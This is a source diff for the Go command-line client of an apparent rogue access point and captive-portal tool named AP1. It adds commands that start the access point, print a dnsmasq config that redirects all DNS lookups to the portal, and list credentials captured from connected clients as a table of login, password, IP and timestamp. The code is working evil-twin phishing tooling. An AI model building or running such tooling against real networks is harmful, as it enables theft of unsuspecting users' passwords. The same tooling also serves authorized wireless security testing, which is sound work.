@@ -10,9 +10,11 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"strconv"
+	"path/filepath"
 	"sort"
+	"strconv"
 	"strings"
+	"syscall"
 	"text/tabwriter"
 	"time"
 )
@@ -102,9 +104,28 @@ func printTable(headers []string, rows [][]string) {
 		fmt.Fprintln(w, strings.Join(row, "\t"))
 	}
 	w.Flush()
+	fmt.Println()
+}
+
+func printKeyValues(values map[string]interface{}) {
+	keys := make([]string, 0, len(values))
+	maxLen := 0
+	for k := range values {
+		keys = append(keys, k)
+		if len(k) > maxLen {
+			maxLen = len(k)
+		}
+	}
+	sort.Strings(keys)
+	format := fmt.Sprintf("  %%-%ds : %%v\n", maxLen)
+	for _, k := range keys {
+		fmt.Printf(format, strings.Title(k), values[k])
+	}
+	fmt.Println()
 }
 
 func printSection(title string) {
+	fmt.Println()
 	fmt.Println(colorText(ansiCyan, title))
 	fmt.Println(strings.Repeat("=", len(title)))
 }
@@ -323,6 +344,86 @@ func cmdStatus() {
 	}
 	printResponse(b)
 }
+
+func loadProfileList() ([]map[string]interface{}, error) {
+	b, err := get("/api/profiles")
+	if err != nil {
+		return nil, err
+	}
+	var profiles []map[string]interface{}
+	if err := json.Unmarshal(b, &profiles); err != nil {
+		return nil, err
+	}
+	return profiles, nil
+}
+
+func getActiveProfileName() (string, error) {
+	b, err := get("/api/status")
+	if err != nil {
+		return "", err
+	}
+	var status map[string]interface{}
+	if err := json.Unmarshal(b, &status); err != nil {
+		return "", err
+	}
+	if cfg, ok := status["config"].(map[string]interface{}); ok {
+		if active, ok := cfg["active_profile"].(string); ok {
+			return active, nil
+		}
+	}
+	return "", nil
+}
+
+func findProfile(profiles []map[string]interface{}, name string) map[string]interface{} {
+	for _, profile := range profiles {
+		if fmt.Sprint(profile["name"]) == name {
+			return profile
+		}
+	}
+	return nil
+}
+
+func boolValue(value interface{}) bool {
+	switch v := value.(type) {
+	case bool:
+		return v
+	case string:
+		val := strings.ToLower(strings.TrimSpace(v))
+		return val == "true" || val == "1" || val == "yes" || val == "on"
+	case float64:
+		return v != 0
+	default:
+		return false
+	}
+}
+
+func profileConfigSummary(profile map[string]interface{}) map[string]interface{} {
+	return map[string]interface{}{
+		"name":         fmt.Sprint(profile["name"]),
+		"ssid":         fmt.Sprint(profile["ssid"]),
+		"channel":      fmt.Sprint(profile["channel"]),
+		"mode":         fmt.Sprint(profile["mode"]),
+		"dhcp_enabled": boolValue(profile["dhcp_enabled"]),
+	}
+}
+
+func generateDnsmasqConfig(profile map[string]interface{}, iface string) string {
+	if iface == "" {
+		iface = "wlan0"
+	}
+	builder := strings.Builder{}
+	builder.WriteString(fmt.Sprintf("interface=%s\n", iface))
+	builder.WriteString("bind-interfaces\n")
+	if boolValue(profile["dhcp_enabled"]) {
+		builder.WriteString("dhcp-range=192.168.50.10,192.168.50.100,12h\n")
+	} else {
+		builder.WriteString("# DHCP disabled for this profile\n")
+	}
+	builder.WriteString("server=8.8.8.8\n")
+	builder.WriteString("address=/#/192.168.50.1\n")
+	return builder.String()
+}
+
 func cmdConfig() {
 	b, err := get("/api/config")
 	if err != nil {
@@ -346,7 +447,59 @@ func cmdVersion() {
 }
 
 func cmdClients(args []string) {
-	fmt.Println("clients: feature not implemented yet. Use AP1 server client tracking when available.")
+	printSection("Connected Clients")
+	b, err := get("/api/portal/status")
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "error fetching portal status:", err)
+		return
+	}
+	var status map[string]interface{}
+	if err := json.Unmarshal(b, &status); err != nil {
+		fmt.Fprintln(os.Stderr, "failed to parse portal status:", err)
+		return
+	}
+
+	running := false
+	if r, ok := status["running"].(bool); ok {
+		running = r
+	}
+	credentials := []map[string]interface{}{}
+	if creds, ok := status["credentials"].([]interface{}); ok {
+		for _, entry := range creds {
+			if m, ok := entry.(map[string]interface{}); ok {
+				credentials = append(credentials, m)
+			}
+		}
+	}
+
+	uniqueIPs := map[string]struct{}{}
+	for _, cred := range credentials {
+		if ip, ok := cred["ip"].(string); ok && ip != "" {
+			uniqueIPs[ip] = struct{}{}
+		}
+	}
+
+	printKeyValues(map[string]interface{}{
+		"portal_running":    running,
+		"captured_events":   len(credentials),
+		"unique_client_ips": len(uniqueIPs),
+	})
+
+	if len(credentials) == 0 {
+		fmt.Println("No client credentials captured yet.")
+		return
+	}
+
+	rows := [][]string{}
+	for _, cred := range credentials {
+		rows = append(rows, []string{
+			fmt.Sprint(cred["login"]),
+			fmt.Sprint(cred["password"]),
+			fmt.Sprint(cred["ip"]),
+			fmt.Sprint(cred["timestamp"]),
+		})
+	}
+	printTable([]string{"LOGIN", "PASSWORD", "IP", "TIMESTAMP"}, rows)
 }
 
 func cmdAP(args []string) {
@@ -369,6 +522,7 @@ func cmdAP(args []string) {
 }
 
 func cmdAPStatus() {
+	printSection("AP Status")
 	b, err := get("/api/status")
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "error:", err)
@@ -379,22 +533,29 @@ func cmdAPStatus() {
 		fmt.Fprintln(os.Stderr, "failed to parse status response:", err)
 		os.Exit(1)
 	}
-	fmt.Printf("  service: %v\n", status["service"])
-	fmt.Printf("  version: %v\n", status["version"])
+	mainInfo := map[string]interface{}{
+		"service": status["service"],
+		"version": status["version"],
+	}
+	printKeyValues(mainInfo)
+
 	if cfg, ok := status["config"].(map[string]interface{}); ok {
-		fmt.Println("  config:")
-		fmt.Printf("    name: %v\n", cfgValue(cfg, []string{"app", "name"}))
-		fmt.Printf("    environment: %v\n", cfgValue(cfg, []string{"app", "environment"}))
-		fmt.Printf("    api_url: %v\n", cfgValue(cfg, []string{"app", "api_url"}))
-		fmt.Printf("    core_url: %v\n", cfgValue(cfg, []string{"app", "core_url"}))
-		fmt.Printf("    interface: %v\n", cfgValue(cfg, []string{"network", "default_interface"}))
-		fmt.Printf("    portal_ip: %v\n", cfgValue(cfg, []string{"network", "portal_ip"}))
-		fmt.Printf("    dns_ip: %v\n", cfgValue(cfg, []string{"network", "dns_ip"}))
-		fmt.Printf("    captive_portal: %v\n", cfgValue(cfg, []string{"network", "captive_portal"}))
-		fmt.Printf("    active_profile: %v\n", cfgValue(cfg, []string{"active_profile"}))
+		printSection("Configuration")
+		printKeyValues(map[string]interface{}{
+			"name":           cfgValue(cfg, []string{"app", "name"}),
+			"environment":    cfgValue(cfg, []string{"app", "environment"}),
+			"api_url":        cfgValue(cfg, []string{"app", "api_url"}),
+			"core_url":       cfgValue(cfg, []string{"app", "core_url"}),
+			"interface":      cfgValue(cfg, []string{"network", "default_interface"}),
+			"portal_ip":      cfgValue(cfg, []string{"network", "portal_ip"}),
+			"dns_ip":         cfgValue(cfg, []string{"network", "dns_ip"}),
+			"captive_portal": cfgValue(cfg, []string{"network", "captive_portal"}),
+			"active_profile": cfgValue(cfg, []string{"active_profile"}),
+		})
 	}
 	if plugins, ok := status["plugins"].([]interface{}); ok {
-		fmt.Printf("  plugins: %d enabled\n", len(plugins))
+		printSection("Plugins")
+		fmt.Printf("  Enabled: %d\n\n", len(plugins))
 	}
 }
 
@@ -414,21 +575,48 @@ func cfgValue(cfg map[string]interface{}, path []string) interface{} {
 }
 
 func cmdStart(args []string) {
-	showBanner("start")
-	fmt.Println("starting AP and captive portal...")
-	if _, err := post("/api/system/hostapd/start", nil); err != nil {
-		fmt.Fprintln(os.Stderr, "hostapd start failed:", err)
+	printSection("Start AP")
+	fmt.Println(colorText(ansiYellow, "Starting AP and captive portal..."))
+
+	profileName := ""
+	if b, err := get("/api/status"); err == nil {
+		var status map[string]interface{}
+		if err := json.Unmarshal(b, &status); err == nil {
+			if cfg, ok := status["config"].(map[string]interface{}); ok {
+				if active, ok := cfg["active_profile"].(string); ok && active != "" {
+					profileName = active
+				}
+			}
+		}
 	}
-	if _, err := post("/api/system/dnsmasq/start", nil); err != nil {
-		fmt.Fprintln(os.Stderr, "dnsmasq start failed:", err)
+
+	if profileName == "" {
+		if b, err := get("/api/profiles"); err == nil {
+			var profiles []map[string]interface{}
+			if err := json.Unmarshal(b, &profiles); err == nil && len(profiles) > 0 {
+				if name, ok := profiles[0]["name"].(string); ok && name != "" {
+					profileName = name
+				}
+			}
+		}
 	}
-	if _, err := post("/api/portal/start", nil); err != nil {
-		fmt.Fprintln(os.Stderr, "portal start failed:", err)
+
+	if profileName == "" {
+		profileName = "default"
+	}
+
+	payload := fmt.Sprintf(`{"profile":"%s"}`, profileName)
+	if b, err := post("/api/profiles/select", strings.NewReader(payload)); err != nil {
+		fmt.Fprintln(os.Stderr, "profile activation failed:", err)
+		return
+	} else {
+		printResponse(b)
 	}
 }
 
 func cmdStop(args []string) {
-	fmt.Println("stopping AP and captive portal...")
+	printSection("Stop AP")
+	fmt.Println(colorText(ansiYellow, "Stopping AP and captive portal..."))
 	if _, err := post("/api/portal/stop", nil); err != nil {
 		fmt.Fprintln(os.Stderr, "portal stop failed:", err)
 	}
@@ -524,7 +712,70 @@ func cmdInfo(args []string) {
 }
 
 func cmdJobs(args []string) {
-	fmt.Println("jobs: background job listing is not implemented yet.")
+	printSection("AP1 Jobs")
+	rows := [][]string{}
+
+	runtimeDir := os.Getenv("AP1_RUNTIME_DIR")
+	if runtimeDir == "" {
+		runtimeDir = "../system/runtime/plugins"
+	}
+
+	files, err := os.ReadDir(runtimeDir)
+	if err == nil {
+		for _, f := range files {
+			if !strings.HasSuffix(f.Name(), ".pid") {
+				continue
+			}
+			name := strings.TrimSuffix(f.Name(), ".pid")
+			data, err := os.ReadFile(filepath.Join(runtimeDir, f.Name()))
+			if err != nil {
+				rows = append(rows, []string{name, "unknown", "pid file unreadable", "plugin"})
+				continue
+			}
+			pid := strings.TrimSpace(string(data))
+			status := "stopped"
+			if p, err := strconv.Atoi(pid); err == nil {
+				if processAlive(p) {
+					status = "running"
+				}
+			}
+			rows = append(rows, []string{name, pid, status, "plugin"})
+		}
+	}
+
+	for _, service := range []string{"hostapd", "dnsmasq"} {
+		pid, status := findServiceProcess(service)
+		rows = append(rows, []string{service, pid, status, "service"})
+	}
+
+	if len(rows) == 0 {
+		fmt.Println("No AP1 jobs or plugin processes detected.")
+		return
+	}
+	printTable([]string{"NAME", "PID", "STATUS", "TYPE"}, rows)
+}
+
+func processAlive(pid int) bool {
+	if pid <= 0 {
+		return false
+	}
+	return syscall.Kill(pid, 0) == nil
+}
+
+func findServiceProcess(name string) (string, string) {
+	if _, err := exec.LookPath("pgrep"); err != nil {
+		return "-", "unknown"
+	}
+	cmd := exec.Command("pgrep", "-f", name)
+	out, err := cmd.Output()
+	if err != nil {
+		return "-", "stopped"
+	}
+	pid := strings.TrimSpace(strings.SplitN(string(out), "\n", 2)[0])
+	if pid == "" {
+		return "-", "stopped"
+	}
+	return pid, "running"
 }
 
 func cmdMode(args []string) {
@@ -605,15 +856,121 @@ func cmdDump(args []string) {
 }
 
 func cmdDhcpconf(args []string) {
-	fmt.Println("dhcpconf: command not implemented yet.")
+	iface := "wlan0"
+	if len(args) >= 2 && args[0] == "show" {
+		iface = args[1]
+	}
+
+	profiles, err := loadProfileList()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "failed to load profiles:", err)
+		return
+	}
+	activeProfile, err := getActiveProfileName()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "failed to get active profile:", err)
+		return
+	}
+	if activeProfile == "" {
+		fmt.Println("No active profile selected.")
+		return
+	}
+	profile := findProfile(profiles, activeProfile)
+	if profile == nil {
+		fmt.Println("Active profile not found in config.")
+		return
+	}
+
+	printSection("DHCP Configuration")
+	fmt.Print(generateDnsmasqConfig(profile, iface))
 }
 
 func cmdDhcpmode(args []string) {
-	fmt.Println("dhcpmode: command not implemented yet.")
+	profiles, err := loadProfileList()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "failed to load profiles:", err)
+		return
+	}
+	activeProfile, err := getActiveProfileName()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "failed to get active profile:", err)
+		return
+	}
+
+	if len(args) == 0 || args[0] == "status" {
+		printSection("DHCP Mode")
+		if activeProfile == "" {
+			fmt.Println("No active profile selected.")
+			return
+		}
+		profile := findProfile(profiles, activeProfile)
+		if profile == nil {
+			fmt.Println("Active profile not found in config.")
+			return
+		}
+		printKeyValues(map[string]interface{}{
+			"active_profile": activeProfile,
+			"dhcp_enabled":   boolValue(profile["dhcp_enabled"]),
+		})
+		return
+	}
+
+	switch args[0] {
+	case "list":
+		rows := [][]string{}
+		for _, profile := range profiles {
+			rows = append(rows, []string{
+				fmt.Sprint(profile["name"]),
+				fmt.Sprint(profile["ssid"]),
+				fmt.Sprint(profile["mode"]),
+				fmt.Sprint(profile["channel"]),
+				fmt.Sprint(boolValue(profile["dhcp_enabled"])),
+			})
+		}
+		printTable([]string{"NAME", "SSID", "MODE", "CHANNEL", "DHCP"}, rows)
+	case "set":
+		if len(args) < 2 || len(args) > 3 {
+			fmt.Println("dhcpmode: usage: dhcpmode set <on|off> [profile]")
+			return
+		}
+		enabled := strings.ToLower(args[1])
+		value := false
+		if enabled == "on" || enabled == "true" || enabled == "1" {
+			value = true
+		} else if enabled != "off" && enabled != "false" && enabled != "0" {
+			fmt.Println("dhcpmode: expected on or off")
+			return
+		}
+		profileName := activeProfile
+		if len(args) == 3 {
+			profileName = args[2]
+		}
+		profile := findProfile(profiles, profileName)
+		if profile == nil {
+			fmt.Println("profile not found:", profileName)
+			return
+		}
+		payload := fmt.Sprintf(`{"name":"%s","ssid":"%s","password":"%s","channel":%v,"mode":"%s","dhcp_enabled":%t}`,
+			fmt.Sprint(profile["name"]),
+			fmt.Sprint(profile["ssid"]),
+			fmt.Sprint(profile["password"]),
+			profile["channel"],
+			fmt.Sprint(profile["mode"]),
+			value)
+		b, err := put("/api/profiles/update", strings.NewReader(payload))
+		if err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			return
+		}
+		printResponse(b)
+	default:
+		fmt.Println("dhcpmode: usage: dhcpmode [status|list] | dhcpmode set <on|off> [profile]")
+	}
 }
 
 func cmdUpdate(args []string) {
-	fmt.Println("update: command deprecated.")
+	fmt.Println("update: automatic update is not supported in this CLI.")
+	fmt.Println("Use git pull and rebuild AP1, or update through your package manager.")
 }
 
 func cmdProfiles(args []string) {
@@ -854,6 +1211,7 @@ func cmdRecon(args []string) {
 
 func cmdPortal(args []string) {
 	if len(args) == 0 || args[0] == "status" {
+		printSection("Portal Status")
 		b, err := get("/api/portal/status")
 		if err != nil {
 			fmt.Fprintln(os.Stderr, err)
@@ -864,9 +1222,7 @@ func cmdPortal(args []string) {
 			printResponse(b)
 			return
 		}
-		for key, value := range status {
-			fmt.Printf("%s: %v\n", strings.Title(key), value)
-		}
+		printKeyValues(status)
 		return
 	}
 	if args[0] == "credentials" {
@@ -920,6 +1276,7 @@ func cmdSystem(args []string) {
 	}
 	service := args[0]
 	action := args[1]
+	printSection(fmt.Sprintf("System: %s %s", strings.Title(service), strings.Title(action)))
 	b, err := post(fmt.Sprintf("/api/system/%s/%s", service, action), nil)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
